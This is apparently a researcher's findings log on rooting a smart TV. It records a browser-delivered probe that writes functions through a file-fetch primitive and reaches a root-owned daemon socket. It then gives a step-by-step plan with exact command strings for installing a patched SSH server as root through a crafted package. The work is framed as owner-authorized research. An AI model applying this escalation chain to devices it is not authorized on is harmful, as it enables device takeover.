# 06 — Superwatch gate green: all four chain prerequisites confirmed (2026-11-06)

> **Follow-up 2026-11-06:** the chain was armed later the same session; root is
> live on 8008. See [findings/07](07-root-armed.md). The "Next" section below
> is retained as the pre-arm plan.

Ran `launcher/recon-superwatch.html` in the TV Browser app
(`http://10.0.0.157:8770/recon-superwatch.html`). Two small functions were
placed into `…/basic/CHA/functions/fetch/` with `fetchFile`, invoked through
`/function/basic/fetch/…`, and both self-deleted afterwards.

**Result: the last gating prerequisite is confirmed. The superwatch socket is
reachable from uid 314 via group 616, and command `85` answered `0`. The
userland is 32-bit ARM. All four build-dependent prerequisites for the 100U7Q
chain are now measured on this unit.**

## Raw result (probe function return)

```json
{
  "ran": "2026-11-06T22:07:57.257Z",
  "uid": 314,
  "gid": 314,
  "groups": [516,546,607,616,701,702,711,712,713,762,816,902,903,904,908,911,912,924,943,314],
  "arch": "arm",
  "platform": "linux",
  "execPath": "/APPS/pkgs/tv.vidaa.app.phoenix/CHA/bin/phoenix",
  "sourceFile": "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/reconprobe_v1.js",
  "uname": "ERR: Command failed: uname -a\n/bin/sh: uname: command not found\n",
  "socketStat": { "mode": "660", "uid": 0, "gid": 616 },
  "varLocal": { "write": true, "read": "ok", "cleanup": true },
  "socket": { "resp": "\u0005\u0000\u0000\u0000901:0", "connected": true },
  "markers": {
    "/APPS/.recon_fetcher_marker": "deleted",
    "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_fetcher_marker": "deleted"
  },
  "resultFile": "/APPS/.recon_probe_result.json",
  "selfDeleted": true
}
```

Cleanup function return:

```json
{ "ran": "2026-11-06T22:07:58.691Z",
  "/APPS/.recon_probe_result.json": "deleted", "selfDeleted": true }
```

## What each field settles

| Field | Reading |
|---|---|
| `uid: 314`, `gid: 314` | app context, as expected |
| `groups` contains **616** | the superwatch socket's group is in the app uid's supplementary set |
| `socketStat` `0660 root:616` | matches the 100U7Q record exactly |
| `socket.connected: true` | `connect()` to `/var/run/superwatch_socket` **succeeded** |
| `socket.resp: "\x05\x00\x00\x00901:0"` | 4-byte LE length 5 + `901:0` — the daemon answered session `901`, **code `0` (OK)** for command `85` (directory size, read-only) |
| `arch: "arm"` | **32-bit ARM userland confirmed** (the phoenix Node binary is ARM32, matching the 100U7Q `EM_ARM` record) |
| `execPath` `…/tv.vidaa.app.phoenix/CHA/bin/phoenix` | the FaaS worker is the phoenix binary, as expected |
| `varLocal.write/read/cleanup: true` | `/var/local` is writable by uid 314 (bonus lane; not needed by the 100U7Q chain) |
| `uname: command not found` | the FaaS worker has no PATH; irrelevant — `process.arch` settles the architecture |
| markers `deleted` | both findings/05 markers removed |
| `selfDeleted: true` (both functions) | no function file left behind |

No install, no postinst, no reboot. The two marker files are gone, the result
file is gone, and both placed functions unlinked themselves.

## All four 100U7Q prerequisites, measured on this unit

| # | Prerequisite | Result |
|---|---|---|
| 1 | `fetcher` `fetchFile` write primitive | **OPEN** — `ret:true, "download finished"` (findings/05) |
| 2 | `/var/run/superwatch_socket` reachable from uid 314 (group 616) | **OPEN** — `connect` succeeded, command `85` → `0` (this note) |
| 3 | `/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/` writable by uid 314 | **OPEN** — function files and marker written (findings/05, this note) |
| 4 | 32-bit ARM userland (`EM_ARM`) | **CONFIRMED** — `process.arch: "arm"` (this note) |

In addition, `hiutils.fileRead` traversal works with array paths (findings/05),
so read-back of the installer log is available too.

## State change

- `capabilities.root` → **viable — all four chain prerequisites confirmed,
  not armed** (2026-11-06).
- EVIDENCE: superwatch row → CONFIRMED; userland row → CONFIRMED; new
  `/var/local` writability row; root row updated.
- The findings/05 markers are cleaned up.

## Next

The chain is ready to arm, but **arming is a separate, owner-authorized step**:

1. Build the per-device installer IPK (patched Dropbear 2022.83, static
   ARM32, owner's public key) per the 100U7Q build recipe.
2. `fetchFile` `sw2.js` into `…/functions/fetch/`, `fetchFile` the IPK into a
   writable `/APPS` path.
3. POST `/function/basic/fetch/sw2` with
   `["70:83:70;re.installer", "71:82:71;<ipk>;re.installer;"]` (uninstall
   then install, empty options).
4. Verify the `postinst` ran as uid 0 (`POSTINST_RAN`, `CapEff`), then
   `ssh -p 8008 root@10.0.0.173` with the owner's key.
5. Teardown: stop Dropbear, remove `/APPS/.re_sshd` and `/APPS/shell`,
   restore `/dev/ptmx` modes, uninstall `re.installer` (`83`).

Nothing in step 1–5 has been done on this unit.
